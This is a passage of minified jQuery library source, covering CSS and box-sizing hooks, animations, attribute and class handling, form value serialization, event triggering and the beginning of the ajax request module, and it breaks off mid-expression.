i,n,a,o,u,l=s.createElement("div"),c=s.createElement("div");c.style&&(c.style.backgroundClip="content-box",c.cloneNode(!0).style.backgroundClip="",v.clearCloneStyle="content-box"===c.style.backgroundClip,w.extend(v,{boxSizingReliable:function(){return e(),n},pixelBoxStyles:function(){return e(),o},pixelPosition:function(){return e(),i},reliableMarginLeft:function(){return e(),u},scrollboxSize:function(){return e(),a}}))}();var He=/^(none|table(?!-c[ea]).+)/,Ke=/^--/,We={position:"absolute",visibility:"hidden",display:"block"},Ve={letterSpacing:"0",fontWeight:"400"},qe=["Webkit","Moz","ms"],Xe=s.createElement("div").style;function Ze(e){var t=w.cssProps[e];return t||(t=w.cssProps[e]=function(e){if(e in Xe)return e;for(var t=e[0].toUpperCase()+e.slice(1),r=qe.length;r--;)if((e=qe[r]+t)in Xe)return e}(e)||e),t}function Je(e,t,r){var i=ne.exec(t);return i?Math.max(0,i[2]-(r||0))+(i[3]||"px"):t}function $e(e,t,r,i,n,a){var s="width"===t?1:0,o=0,u=0;if(r===(i?"border":"content"))return 0;for(;s<4;s+=2)"margin"===r&&(u+=w.css(e,r+ae[s],!0,n)),i?("content"===r&&(u-=w.css(e,"padding"+ae[s],!0,n)),"margin"!==r&&(u-=w.css(e,"border"+ae[s]+"Width",!0,n))):(u+=w.css(e,"padding"+ae[s],!0,n),"padding"!==r?u+=w.css(e,"border"+ae[s]+"Width",!0,n):o+=w.css(e,"border"+ae[s]+"Width",!0,n));return!i&&a>=0&&(u+=Math.max(0,Math.ceil(e["offset"+t[0].toUpperCase()+t.slice(1)]-a-u-o-.5))),u}function et(e,t,r){var i=ze(e),n=Ye(e,t,i),a="border-box"===w.css(e,"boxSizing",!1,i),s=a;if(Ue.test(n)){if(!r)return n;n="auto"}return s=s&&(v.boxSizingReliable()||n===e.style[t]),("auto"===n||!parseFloat(n)&&"inline"===w.css(e,"display",!1,i))&&(n=e["offset"+t[0].toUpperCase()+t.slice(1)],s=!0),(n=parseFloat(n)||0)+$e(e,t,r||(a?"border":"content"),s,i,n)+"px"}function tt(e,t,r,i,n){return new tt.prototype.init(e,t,r,i,n)}w.extend({cssHooks:{opacity:{get:function(e,t){if(t){var r=Ye(e,"opacity");return""===r?"1":r}}}},cssNumber:{animationIterationCount:!0,columnCount:!0,fillOpacity:!0,flexGrow:!0,flexShrink:!0,fontWeight:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,widows:!0,zIndex:!0,zoom:!0},cssProps:{},style:function(e,t,r,i){if(e&&3!==e.nodeType&&8!==e.nodeType&&e.style){var n,a,s,o=q(t),u=Ke.test(t),l=e.style;if(u||(t=Ze(o)),s=w.cssHooks[t]||w.cssHooks[o],void 0===r)return s&&"get"in s&&void 0!==(n=s.get(e,!1,i))?n:l[t];"string"===(a=typeof r)&&(n=ne.exec(r))&&n[1]&&(r=ue(e,t,n),a="number"),null!=r&&r==r&&("number"===a&&(r+=n&&n[3]||(w.cssNumber[o]?"":"px")),v.clearCloneStyle||""!==r||0!==t.indexOf("background")||(l[t]="inherit"),s&&"set"in s&&void 0===(r=s.set(e,r,i))||(u?l.setProperty(t,r):l[t]=r))}},css:function(e,t,r,i){var n,a,s,o=q(t);return Ke.test(t)||(t=Ze(o)),(s=w.cssHooks[t]||w.cssHooks[o])&&"get"in s&&(n=s.get(e,!0,r)),void 0===n&&(n=Ye(e,t,i)),"normal"===n&&t in Ve&&(n=Ve[t]),""===r||r?(a=parseFloat(n),!0===r||isFinite(a)?a||0:n):n}}),w.each(["height","width"],function(e,t){w.cssHooks[t]={get:function(e,r,i){if(r)return!He.test(w.css(e,"display"))||e.getClientRects().length&&e.getBoundingClientRect().width?et(e,t,i):oe(e,We,function(){return et(e,t,i)})},set:function(e,r,i){var n,a=ze(e),s="border-box"===w.css(e,"boxSizing",!1,a),o=i&&$e(e,t,i,s,a);return s&&v.scrollboxSize()===a.position&&(o-=Math.ceil(e["offset"+t[0].toUpperCase()+t.slice(1)]-parseFloat(a[t])-$e(e,t,"border",!1,a)-.5)),o&&(n=ne.exec(r))&&"px"!==(n[3]||"px")&&(e.style[t]=r,r=w.css(e,t)),Je(0,r,o)}}}),w.cssHooks.marginLeft=Qe(v.reliableMarginLeft,function(e,t){if(t)return(parseFloat(Ye(e,"marginLeft"))||e.getBoundingClientRect().left-oe(e,{marginLeft:0},function(){return e.getBoundingClientRect().left}))+"px"}),w.each({margin:"",padding:"",border:"Width"},function(e,t){w.cssHooks[e+t]={expand:function(r){for(var i=0,n={},a="string"==typeof r?r.split(" "):[r];i<4;i++)n[e+ae[i]+t]=a[i]||a[i-2]||a[0];return n}},"margin"!==e&&(w.cssHooks[e+t].set=Je)}),w.fn.extend({css:function(e,t){return H(this,function(e,t,r){var i,n,a={},s=0;if(Array.isArray(t)){for(i=ze(e),n=t.length;s<n;s++)a[t[s]]=w.css(e,t[s],!1,i);return a}return void 0!==r?w.style(e,t,r):w.css(e,t)},e,t,arguments.length>1)}}),w.Tween=tt,tt.prototype={constructor:tt,init:function(e,t,r,i,n,a){this.elem=e,this.prop=r,this.easing=n||w.easing._default,this.options=t,this.start=this.now=this.cur(),this.end=i,this.unit=a||(w.cssNumber[r]?"":"px")},cur:function(){var e=tt.propHooks[this.prop];return e&&e.get?e.get(this):tt.propHooks._default.get(this)},run:function(e){var t,r=tt.propHooks[this.prop];return this.options.duration?this.pos=t=w.easing[this.easing](e,this.options.duration*e,0,1,this.options.duration):this.pos=t=e,this.now=(this.end-this.start)*t+this.start,this.options.step&&this.options.step.call(this.elem,this.now,this),r&&r.set?r.set(this):tt.propHooks._default.set(this),this}},tt.prototype.init.prototype=tt.prototype,tt.propHooks={_default:{get:function(e){var t;return 1!==e.elem.nodeType||null!=e.elem[e.prop]&&null==e.elem.style[e.prop]?e.elem[e.prop]:(t=w.css(e.elem,e.prop,""))&&"auto"!==t?t:0},set:function(e){w.fx.step[e.prop]?w.fx.step[e.prop](e):1!==e.elem.nodeType||null==e.elem.style[w.cssProps[e.prop]]&&!w.cssHooks[e.prop]?e.elem[e.prop]=e.now:w.style(e.elem,e.prop,e.now+e.unit)}}},tt.propHooks.scrollTop=tt.propHooks.scrollLeft={set:function(e){e.elem.nodeType&&e.elem.parentNode&&(e.elem[e.prop]=e.now)}},w.easing={linear:function(e){return e},swing:function(e){return.5-Math.cos(e*Math.PI)/2},_default:"swing"},w.fx=tt.prototype.init,w.fx.step={};var rt,it,nt=/^(?:toggle|show|hide)$/,at=/queueHooks$/;function st(){it&&(!1===s.hidden&&r.requestAnimationFrame?r.requestAnimationFrame(st):r.setTimeout(st,w.fx.interval),w.fx.tick())}function ot(){return r.setTimeout(function(){rt=void 0}),rt=Date.now()}function ut(e,t){var r,i=0,n={height:e};for(t=t?1:0;i<4;i+=2-t)n["margin"+(r=ae[i])]=n["padding"+r]=e;return t&&(n.opacity=n.width=e),n}function lt(e,t,r){for(var i,n=(ct.tweeners[t]||[]).concat(ct.tweeners["*"]),a=0,s=n.length;a<s;a++)if(i=n[a].call(r,t,e))return i}function ct(e,t,r){var i,n,a=0,s=ct.prefilters.length,o=w.Deferred().always(function(){delete u.elem}),u=function(){if(n)return!1;for(var t=rt||ot(),r=Math.max(0,l.startTime+l.duration-t),i=1-(r/l.duration||0),a=0,s=l.tweens.length;a<s;a++)l.tweens[a].run(i);return o.notifyWith(e,[l,i,r]),i<1&&s?r:(s||o.notifyWith(e,[l,1,0]),o.resolveWith(e,[l]),!1)},l=o.promise({elem:e,props:w.extend({},t),opts:w.extend(!0,{specialEasing:{},easing:w.easing._default},r),originalProperties:t,originalOptions:r,startTime:rt||ot(),duration:r.duration,tweens:[],createTween:function(t,r){var i=w.Tween(e,l.opts,t,r,l.opts.specialEasing[t]||l.opts.easing);return l.tweens.push(i),i},stop:function(t){var r=0,i=t?l.tweens.length:0;if(n)return this;for(n=!0;r<i;r++)l.tweens[r].run(1);return t?(o.notifyWith(e,[l,1,0]),o.resolveWith(e,[l,t])):o.rejectWith(e,[l,t]),this}}),c=l.props;for(!function(e,t){var r,i,n,a,s;for(r in e)if(n=t[i=q(r)],a=e[r],Array.isArray(a)&&(n=a[1],a=e[r]=a[0]),r!==i&&(e[i]=a,delete e[r]),(s=w.cssHooks[i])&&"expand"in s)for(r in a=s.expand(a),delete e[i],a)r in e||(e[r]=a[r],t[r]=n);else t[i]=n}(c,l.opts.specialEasing);a<s;a++)if(i=ct.prefilters[a].call(l,e,c,l.opts))return m(i.stop)&&(w._queueHooks(l.elem,l.opts.queue).stop=i.stop.bind(i)),i;return w.map(c,lt,l),m(l.opts.start)&&l.opts.start.call(e,l),l.progress(l.opts.progress).done(l.opts.done,l.opts.complete).fail(l.opts.fail).always(l.opts.always),w.fx.timer(w.extend(u,{elem:e,anim:l,queue:l.opts.queue})),l}w.Animation=w.extend(ct,{tweeners:{"*":[function(e,t){var r=this.createTween(e,t);return ue(r.elem,e,ne.exec(t),r),r}]},tweener:function(e,t){m(e)?(t=e,e=["*"]):e=e.match(F);for(var r,i=0,n=e.length;i<n;i++)r=e[i],ct.tweeners[r]=ct.tweeners[r]||[],ct.tweeners[r].unshift(t)},prefilters:[function(e,t,r){var i,n,a,s,o,u,l,c,d="width"in t||"height"in t,f=this,h={},p=e.style,g=e.nodeType&&se(e),y=J.get(e,"fxshow");for(i in r.queue||(null==(s=w._queueHooks(e,"fx")).unqueued&&(s.unqueued=0,o=s.empty.fire,s.empty.fire=function(){s.unqueued||o()}),s.unqueued++,f.always(function(){f.always(function(){s.unqueued--,w.queue(e,"fx").length||s.empty.fire()})})),t)if(n=t[i],nt.test(n)){if(delete t[i],a=a||"toggle"===n,n===(g?"hide":"show")){if("show"!==n||!y||void 0===y[i])continue;g=!0}h[i]=y&&y[i]||w.style(e,i)}if((u=!w.isEmptyObject(t))||!w.isEmptyObject(h))for(i in d&&1===e.nodeType&&(r.overflow=[p.overflow,p.overflowX,p.overflowY],null==(l=y&&y.display)&&(l=J.get(e,"display")),"none"===(c=w.css(e,"display"))&&(l?c=l:(de([e],!0),l=e.style.display||l,c=w.css(e,"display"),de([e]))),("inline"===c||"inline-block"===c&&null!=l)&&"none"===w.css(e,"float")&&(u||(f.done(function(){p.display=l}),null==l&&(c=p.display,l="none"===c?"":c)),p.display="inline-block")),r.overflow&&(p.overflow="hidden",f.always(function(){p.overflow=r.overflow[0],p.overflowX=r.overflow[1],p.overflowY=r.overflow[2]})),u=!1,h)u||(y?"hidden"in y&&(g=y.hidden):y=J.access(e,"fxshow",{display:l}),a&&(y.hidden=!g),g&&de([e],!0),f.done(function(){for(i in g||de([e]),J.remove(e,"fxshow"),h)w.style(e,i,h[i])})),u=lt(g?y[i]:0,i,f),i in y||(y[i]=u.start,g&&(u.end=u.start,u.start=0))}],prefilter:function(e,t){t?ct.prefilters.unshift(e):ct.prefilters.push(e)}}),w.speed=function(e,t,r){var i=e&&"object"==typeof e?w.extend({},e):{complete:r||!r&&t||m(e)&&e,duration:e,easing:r&&t||t&&!m(t)&&t};return w.fx.off?i.duration=0:"number"!=typeof i.duration&&(i.duration in w.fx.speeds?i.duration=w.fx.speeds[i.duration]:i.duration=w.fx.speeds._default),null!=i.queue&&!0!==i.queue||(i.queue="fx"),i.old=i.complete,i.complete=function(){m(i.old)&&i.old.call(this),i.queue&&w.dequeue(this,i.queue)},i},w.fn.extend({fadeTo:function(e,t,r,i){return this.filter(se).css("opacity",0).show().end().animate({opacity:t},e,r,i)},animate:function(e,t,r,i){var n=w.isEmptyObject(e),a=w.speed(t,r,i),s=function(){var t=ct(this,w.extend({},e),a);(n||J.get(this,"finish"))&&t.stop(!0)};return s.finish=s,n||!1===a.queue?this.each(s):this.queue(a.queue,s)},stop:function(e,t,r){var i=function(e){var t=e.stop;delete e.stop,t(r)};return"string"!=typeof e&&(r=t,t=e,e=void 0),t&&!1!==e&&this.queue(e||"fx",[]),this.each(function(){var t=!0,n=null!=e&&e+"queueHooks",a=w.timers,s=J.get(this);if(n)s[n]&&s[n].stop&&i(s[n]);else for(n in s)s[n]&&s[n].stop&&at.test(n)&&i(s[n]);for(n=a.length;n--;)a[n].elem!==this||null!=e&&a[n].queue!==e||(a[n].anim.stop(r),t=!1,a.splice(n,1));!t&&r||w.dequeue(this,e)})},finish:function(e){return!1!==e&&(e=e||"fx"),this.each(function(){var t,r=J.get(this),i=r[e+"queue"],n=r[e+"queueHooks"],a=w.timers,s=i?i.length:0;for(r.finish=!0,w.queue(this,e,[]),n&&n.stop&&n.stop.call(this,!0),t=a.length;t--;)a[t].elem===this&&a[t].queue===e&&(a[t].anim.stop(!0),a.splice(t,1));for(t=0;t<s;t++)i[t]&&i[t].finish&&i[t].finish.call(this);delete r.finish})}}),w.each(["toggle","show","hide"],function(e,t){var r=w.fn[t];w.fn[t]=function(e,i,n){return null==e||"boolean"==typeof e?r.apply(this,arguments):this.animate(ut(t,!0),e,i,n)}}),w.each({slideDown:ut("show"),slideUp:ut("hide"),slideToggle:ut("toggle"),fadeIn:{opacity:"show"},fadeOut:{opacity:"hide"},fadeToggle:{opacity:"toggle"}},function(e,t){w.fn[e]=function(e,r,i){return this.animate(t,e,r,i)}}),w.timers=[],w.fx.tick=function(){var e,t=0,r=w.timers;for(rt=Date.now();t<r.length;t++)(e=r[t])()||r[t]!==e||r.splice(t--,1);r.length||w.fx.stop(),rt=void 0},w.fx.timer=function(e){w.timers.push(e),w.fx.start()},w.fx.interval=13,w.fx.start=function(){it||(it=!0,st())},w.fx.stop=function(){it=null},w.fx.speeds={slow:600,fast:200,_default:400},w.fn.delay=function(e,t){return e=w.fx&&w.fx.speeds[e]||e,t=t||"fx",this.queue(t,function(t,i){var n=r.setTimeout(t,e);i.stop=function(){r.clearTimeout(n)}})},function(){var e=s.createElement("input"),t=s.createElement("select").appendChild(s.createElement("option"));e.type="checkbox",v.checkOn=""!==e.value,v.optSelected=t.selected,(e=s.createElement("input")).value="t",e.type="radio",v.radioValue="t"===e.value}();var dt,ft=w.expr.attrHandle;w.fn.extend({attr:function(e,t){return H(this,w.attr,e,t,arguments.length>1)},removeAttr:function(e){return this.each(function(){w.removeAttr(this,e)})}}),w.extend({attr:function(e,t,r){var i,n,a=e.nodeType;if(3!==a&&8!==a&&2!==a)return void 0===e.getAttribute?w.prop(e,t,r):(1===a&&w.isXMLDoc(e)||(n=w.attrHooks[t.toLowerCase()]||(w.expr.match.bool.test(t)?dt:void 0)),void 0!==r?null===r?void w.removeAttr(e,t):n&&"set"in n&&void 0!==(i=n.set(e,r,t))?i:(e.setAttribute(t,r+""),r):n&&"get"in n&&null!==(i=n.get(e,t))?i:null==(i=w.find.attr(e,t))?void 0:i)},attrHooks:{type:{set:function(e,t){if(!v.radioValue&&"radio"===t&&I(e,"input")){var r=e.value;return e.setAttribute("type",t),r&&(e.value=r),t}}}},removeAttr:function(e,t){var r,i=0,n=t&&t.match(F);if(n&&1===e.nodeType)for(;r=n[i++];)e.removeAttribute(r)}}),dt={set:function(e,t,r){return!1===t?w.removeAttr(e,r):e.setAttribute(r,r),r}},w.each(w.expr.match.bool.source.match(/\w+/g),function(e,t){var r=ft[t]||w.find.attr;ft[t]=function(e,t,i){var n,a,s=t.toLowerCase();return i||(a=ft[s],ft[s]=n,n=null!=r(e,t,i)?s:null,ft[s]=a),n}});var ht=/^(?:input|select|textarea|button)$/i,pt=/^(?:a|area)$/i;function gt(e){return(e.match(F)||[]).join(" ")}function yt(e){return e.getAttribute&&e.getAttribute("class")||""}function vt(e){return Array.isArray(e)?e:"string"==typeof e&&e.match(F)||[]}w.fn.extend({prop:function(e,t){return H(this,w.prop,e,t,arguments.length>1)},removeProp:function(e){return this.each(function(){delete this[w.propFix[e]||e]})}}),w.extend({prop:function(e,t,r){var i,n,a=e.nodeType;if(3!==a&&8!==a&&2!==a)return 1===a&&w.isXMLDoc(e)||(t=w.propFix[t]||t,n=w.propHooks[t]),void 0!==r?n&&"set"in n&&void 0!==(i=n.set(e,r,t))?i:e[t]=r:n&&"get"in n&&null!==(i=n.get(e,t))?i:e[t]},propHooks:{tabIndex:{get:function(e){var t=w.find.attr(e,"tabindex");return t?parseInt(t,10):ht.test(e.nodeName)||pt.test(e.nodeName)&&e.href?0:-1}}},propFix:{for:"htmlFor",class:"className"}}),v.optSelected||(w.propHooks.selected={get:function(e){var t=e.parentNode;return t&&t.parentNode&&t.parentNode.selectedIndex,null},set:function(e){var t=e.parentNode;t&&(t.selectedIndex,t.parentNode&&t.parentNode.selectedIndex)}}),w.each(["tabIndex","readOnly","maxLength","cellSpacing","cellPadding","rowSpan","colSpan","useMap","frameBorder","contentEditable"],function(){w.propFix[this.toLowerCase()]=this}),w.fn.extend({addClass:function(e){var t,r,i,n,a,s,o,u=0;if(m(e))return this.each(function(t){w(this).addClass(e.call(this,t,yt(this)))});if((t=vt(e)).length)for(;r=this[u++];)if(n=yt(r),i=1===r.nodeType&&" "+gt(n)+" "){for(s=0;a=t[s++];)i.indexOf(" "+a+" ")<0&&(i+=a+" ");n!==(o=gt(i))&&r.setAttribute("class",o)}return this},removeClass:function(e){var t,r,i,n,a,s,o,u=0;if(m(e))return this.each(function(t){w(this).removeClass(e.call(this,t,yt(this)))});if(!arguments.length)return this.attr("class","");if((t=vt(e)).length)for(;r=this[u++];)if(n=yt(r),i=1===r.nodeType&&" "+gt(n)+" "){for(s=0;a=t[s++];)for(;i.indexOf(" "+a+" ")>-1;)i=i.replace(" "+a+" "," ");n!==(o=gt(i))&&r.setAttribute("class",o)}return this},toggleClass:function(e,t){var r=typeof e,i="string"===r||Array.isArray(e);return"boolean"==typeof t&&i?t?this.addClass(e):this.removeClass(e):m(e)?this.each(function(r){w(this).toggleClass(e.call(this,r,yt(this),t),t)}):this.each(function(){var t,n,a,s;if(i)for(n=0,a=w(this),s=vt(e);t=s[n++];)a.hasClass(t)?a.removeClass(t):a.addClass(t);else void 0!==e&&"boolean"!==r||((t=yt(this))&&J.set(this,"__className__",t),this.setAttribute&&this.setAttribute("class",t||!1===e?"":J.get(this,"__className__")||""))})},hasClass:function(e){var t,r,i=0;for(t=" "+e+" ";r=this[i++];)if(1===r.nodeType&&(" "+gt(yt(r))+" ").indexOf(t)>-1)return!0;return!1}});var mt=/\r/g;w.fn.extend({val:function(e){var t,r,i,n=this[0];return arguments.length?(i=m(e),this.each(function(r){var n;1===this.nodeType&&(null==(n=i?e.call(this,r,w(this).val()):e)?n="":"number"==typeof n?n+="":Array.isArray(n)&&(n=w.map(n,function(e){return null==e?"":e+""})),(t=w.valHooks[this.type]||w.valHooks[this.nodeName.toLowerCase()])&&"set"in t&&void 0!==t.set(this,n,"value")||(this.value=n))})):n?(t=w.valHooks[n.type]||w.valHooks[n.nodeName.toLowerCase()])&&"get"in t&&void 0!==(r=t.get(n,"value"))?r:"string"==typeof(r=n.value)?r.replace(mt,""):null==r?"":r:void 0}}),w.extend({valHooks:{option:{get:function(e){var t=w.find.attr(e,"value");return null!=t?t:gt(w.text(e))}},select:{get:function(e){var t,r,i,n=e.options,a=e.selectedIndex,s="select-one"===e.type,o=s?null:[],u=s?a+1:n.length;for(i=a<0?u:s?a:0;i<u;i++)if(((r=n[i]).selected||i===a)&&!r.disabled&&(!r.parentNode.disabled||!I(r.parentNode,"optgroup"))){if(t=w(r).val(),s)return t;o.push(t)}return o},set:function(e,t){for(var r,i,n=e.options,a=w.makeArray(t),s=n.length;s--;)((i=n[s]).selected=w.inArray(w.valHooks.option.get(i),a)>-1)&&(r=!0);return r||(e.selectedIndex=-1),a}}}}),w.each(["radio","checkbox"],function(){w.valHooks[this]={set:function(e,t){if(Array.isArray(t))return e.checked=w.inArray(w(e).val(),t)>-1}},v.checkOn||(w.valHooks[this].get=function(e){return null===e.getAttribute("value")?"on":e.value})}),v.focusin="onfocusin"in r;var Lt=/^(?:focusinfocus|focusoutblur)$/,Mt=function(e){e.stopPropagation()};w.extend(w.event,{trigger:function(e,t,i,n){var a,o,u,l,c,d,f,h,g=[i||s],y=p.call(e,"type")?e.type:e,v=p.call(e,"namespace")?e.namespace.split("."):[];if(o=h=u=i=i||s,3!==i.nodeType&&8!==i.nodeType&&!Lt.test(y+w.event.triggered)&&(y.indexOf(".")>-1&&(v=y.split("."),y=v.shift(),v.sort()),c=y.indexOf(":")<0&&"on"+y,(e=e[w.expando]?e:new w.Event(y,"object"==typeof e&&e)).isTrigger=n?2:3,e.namespace=v.join("."),e.rnamespace=e.namespace?new RegExp("(^|\\.)"+v.join("\\.(?:.*\\.|)")+"(\\.|$)"):null,e.result=void 0,e.target||(e.target=i),t=null==t?[e]:w.makeArray(t,[e]),f=w.event.special[y]||{},n||!f.trigger||!1!==f.trigger.apply(i,t))){if(!n&&!f.noBubble&&!L(i)){for(l=f.delegateType||y,Lt.test(l+y)||(o=o.parentNode);o;o=o.parentNode)g.push(o),u=o;u===(i.ownerDocument||s)&&g.push(u.defaultView||u.parentWindow||r)}for(a=0;(o=g[a++])&&!e.isPropagationStopped();)h=o,e.type=a>1?l:f.bindType||y,(d=(J.get(o,"events")||{})[e.type]&&J.get(o,"handle"))&&d.apply(o,t),(d=c&&o[c])&&d.apply&&X(o)&&(e.result=d.apply(o,t),!1===e.result&&e.preventDefault());return e.type=y,n||e.isDefaultPrevented()||f._default&&!1!==f._default.apply(g.pop(),t)||!X(i)||c&&m(i[y])&&!L(i)&&((u=i[c])&&(i[c]=null),w.event.triggered=y,e.isPropagationStopped()&&h.addEventListener(y,Mt),i[y](),e.isPropagationStopped()&&h.removeEventListener(y,Mt),w.event.triggered=void 0,u&&(i[c]=u)),e.result}},simulate:function(e,t,r){var i=w.extend(new w.Event,r,{type:e,isSimulated:!0});w.event.trigger(i,null,t)}}),w.fn.extend({trigger:function(e,t){return this.each(function(){w.event.trigger(e,t,this)})},triggerHandler:function(e,t){var r=this[0];if(r)return w.event.trigger(e,t,r,!0)}}),v.focusin||w.each({focus:"focusin",blur:"focusout"},function(e,t){var r=function(e){w.event.simulate(t,e.target,w.event.fix(e))};w.event.special[t]={setup:function(){var i=this.ownerDocument||this,n=J.access(i,t);n||i.addEventListener(e,r,!0),J.access(i,t,(n||0)+1)},teardown:function(){var i=this.ownerDocument||this,n=J.access(i,t)-1;n?J.access(i,t,n):(i.removeEventListener(e,r,!0),J.remove(i,t))}}});var Tt=r.location,At=Date.now(),wt=/\?/;w.parseXML=function(e){var t;if(!e||"string"!=typeof e)return null;try{t=(new r.DOMParser).parseFromString(e,"text/xml")}catch(e){t=void 0}return t&&!t.getElementsByTagName("parsererror").length||w.error("Invalid XML: "+e),t};var Et=/\[\]$/,St=/\r?\n/g,Dt=/^(?:submit|button|image|reset|file)$/i,bt=/^(?:input|select|textarea|keygen)/i;function jt(e,t,r,i){var n;if(Array.isArray(t))w.each(t,function(t,n){r||Et.test(e)?i(e,n):jt(e+"["+("object"==typeof n&&null!=n?t:"")+"]",n,r,i)});else if(r||"object"!==A(t))i(e,t);else for(n in t)jt(e+"["+n+"]",t[n],r,i)}w.param=function(e,t){var r,i=[],n=function(e,t){var r=m(t)?t():t;i[i.length]=encodeURIComponent(e)+"="+encodeURIComponent(null==r?"":r)};if(Array.isArray(e)||e.jquery&&!w.isPlainObject(e))w.each(e,function(){n(this.name,this.value)});else for(r in e)jt(r,e[r],t,n);return i.join("&")},w.fn.extend({serialize:function(){return w.param(this.serializeArray())},serializeArray:function(){return this.map(function(){var e=w.prop(this,"elements");return e?w.makeArray(e):this}).filter(function(){var e=this.type;return this.name&&!w(this).is(":disabled")&&bt.test(this.nodeName)&&!Dt.test(e)&&(this.checked||!fe.test(e))}).map(function(e,t){var r=w(this).val();return null==r?null:Array.isArray(r)?w.map(r,function(e){return{name:t.name,value:e.replace(St,"\r\n")}}):{name:t.name,value:r.replace(St,"\r\n")}}).get()}});var Ct=/%20/g,It=/#.*$/,xt=/([?&])_=[^&]*/,Nt=/^(.*?):[ \t]*([^\r\n]*)$/gm,_t=/^(?:GET|HEAD)$/,Ot=/^\/\//,kt={},Rt={},Pt="*/".concat("*"),Ft=s.createElement("a");function Bt(e){return function(t,r){"string"!=typeof t&&(r=t,t="*");var i,n=0,a=t.toLowerCase().match(F)||[];if(m(r))for(;i=a[n++];)"+"===i[0]?(i=i.slice(1)||"*",(e[i]=e[i]||[]).unshift(r)):(e[i]=e[i]||[]).push(r)}}function Ut(e,t,r,i){var n={},a=e===Rt;function s(o){var u;return n[o]=!0,w.each(e[o]||[],function(e,o){var l=o(t,r,i);return"string"!=typeof l||a||n[l]?a?!(u=l):void 0:(t.dataTypes.unshift(l),s(l),!1)}),u}return s(t.dataTypes[0])||!n["*"]&&s("*")}function zt(e,t){var r,i,n=w.ajaxSettings.flatOptions||{};for(r in t)void 0!==t[r]&&((n[r]?e:i||(i={}))[r]=t[r]);return i&&w.extend(!0,e,i),e}Ft.href=Tt.href,w.extend({active:0,lastModified:{},etag:{},ajaxSettings:{url:Tt.href,type:"GET",isLocal:/^(?:about|app|app-storage|.+-extension|file|res|widget):$/.test(Tt.protocol),global:!0,processData:!0,async:!0,contentType:"application/x-www-form-urlencoded; charset=UTF-8",accepts:{"*":Pt,text:"text/plain",html:"text/html",xml:"application/xml, text/xml",json:"application/json, text/javascript"},contents:{xml:/\bxml\b/,html:/\bhtml/,json:/\bjson\b/},responseFields:{xml:"responseXML",text:"responseText",json:"responseJSON"},converters:{"* text":String,"text html":!0,"text json":JSON.parse,"text xml":w.parseXML},flatOptions:{url:!0,context:!0}},ajaxSetup:function(e,t){return t?zt(zt(e,w.ajaxSettings),t):zt(w.ajaxSettings,e)},ajaxPrefilter:Bt(kt),ajaxTransport:Bt(Rt),ajax:function(e,t){"object"==typeof e&&(t=e,e=void 0),t=t||{};var i,n,a,o,u,l,c,d,f,h,p=w.ajaxSetup({},t),g=p.context||p,y=p.context&&(g.nodeType||g.jquery)?w(g):w.event,v=w.Deferred(),m=w.Callbacks("once memory"),L=p.statusCode||{},M={},T={},A="canceled",E={readyState:0,getResponseHeader:function(e){var t;if(c){if(!o)for(o={};t=Nt.exec(a);)o[t[1].toLowerCase()]=t[2];t=o[e.toLowerCase()]}return null==t?null:t},getAllResponseHeaders:function(){return c?a:null},setRequestHeader:function(e,t){return null==c&&(e=T[e.toLowerCase()]=T[e.toLowerCase()]||e,M[e]=t),this},overrideMimeType:function(e){return null==c&&(p.mimeType=e),this},statusCode:function(e){var t;if(e)if(c)E.always(e[E.status]);else for(t in e)L[t]=[L[t],e[t]];return this},abort:function(e){var t=e||A;return i&&i.abort(t),S(0,t),this}};if(v.promise(E),p.url=((e||p.url||Tt.href)+"").replace(Ot,Tt.protocol+"//"),p.type=t.method||t.type||p.method||p.type,p.dataTypes=(p.dataType||"*").toLowerCase().match(F)||[""],null==p.crossDomain){l=s.createElement("a");try{l.href=p.url,l.href=l.href,p.crossDomain=Ft.protocol+"//"+Ft.host!=l.protocol+"//"+l.host}catch(e){p.crossDomain=!0}}if(p.data&&p.processData&&"string"!=typeof p.data&&(p.data=w.param(p.data,p.traditional)),Ut(kt,p,t,E),c)return E;for(f in(d=w.event&&p.global)&&0==w.active++&&w.event.trigger("ajaxStart"),p.type=p.type.toUpperCase(),p.hasContent=!_t.test(p.type),n=p.url.replace(It,""),p.hasContent?p.data&&p.processData&&0===(p.contentType||"").indexOf("application/x-www-form-urlencoded")&&(p.data=p.data.replace(Ct,"+")):(h=p.url.slice(n.length),p.data&&(p.processData||"string"==typeof p.data)&&(n+=(wt.test(n)?"&":"?")+p.data,delete p.data),!1===p.cache&&(n=n.replace(xt,"$1"),h=(wt.test(n)?"&":"?")+"_="+At+++h),p.url=n+h),p.ifModified&&(w.lastModified[n]&&E.setRequestHeader("If-Modified-Since",w.lastModified[n]),w.etag[n]&&E.setRequestHeader("If-None-Match",w.etag[n])),(p.data&&p.hasContent&&!1!==p.contentType||t.contentType)&&E.setRequestHeader("Content-Type",p.contentType),E.setRequestHeader("Accept",p.dataTypes[0]&&p.accepts[p.dataTypes[0]]?p.accepts[p.dataTypes[0]]+("*"!==p.dataTypes[0]?", "+Pt+"; q=0.01":""):p.accepts["*"]),p.headers)E.setRequestHeader(f,p.headers[f]);if(p.beforeSend&&(!1===p.beforeSend.call(g,E,p)||c))return E.abort();if(A="abort",m.add(p.complete),E.done(p.success),E.fail(p.error),i=Ut(Rt,p,t,E)){if(E.readyState=1,d&&y.trigger("ajaxSend",[E,p]),c)return E;p.async&&p.timeout>0&&(u=r.setTimeout(function(){E.abort("timeout")},p.timeout));try{c=!1,i.send(M,S)}catch(e){if(c)throw e;S(-1,e)}}else S(-1,"No Transport");function S(e,t,s,o){var l,f,h,M,T,A=t;c||(c=!0,u&&r.clearTimeout(u),i=void 0,a=o||"",E.readyState=e>0?4:0,l=e>=200&&e<300||304===e,s&&(M=function(e,t,r){for(var i,n,a,s,o=e.contents,u=e.dataTypes;"*"===u[0];)u.shift(),void 0===i&&(i=e.mimeType||t.getResponseHeader("Content-Type"));if(i)for(n in o)if(o[n]&&o[n].test(i)){u.unshift(n);break}if(u[0]in r)a=u[0];else{for(n in r){if(!u[0]||e.converters[n+" "+u[0]]){a=n;break}s||(s=n)}a=a||s}if(a)return a!==u[0]&&u.unshift(a),r[a]}(p,E,s)),M=function(e,t,r,i){var n,a,s,o,u,l={},c=e.dataTypes.slice();if(c[1])for(s in e.converters)l[s.toLowerCase()]=e.converters[s];for(a=c.shift();a;)if(e.responseFields[a]&&(r[e.responseFields[a]]=t),!u&&i&&e.dataFilter&&(t=e.dataFilter(t,e.dataType)),u=a,a=c.shift())if("*"===a)a=u;else if("*"!==u&&u!==a){if(!(s=l[u+" "+a]||l["* "+a]))for(n in l)if((o=n.split(" "))[1]===a&&(s=l[u+" "+o[0]]||l["* 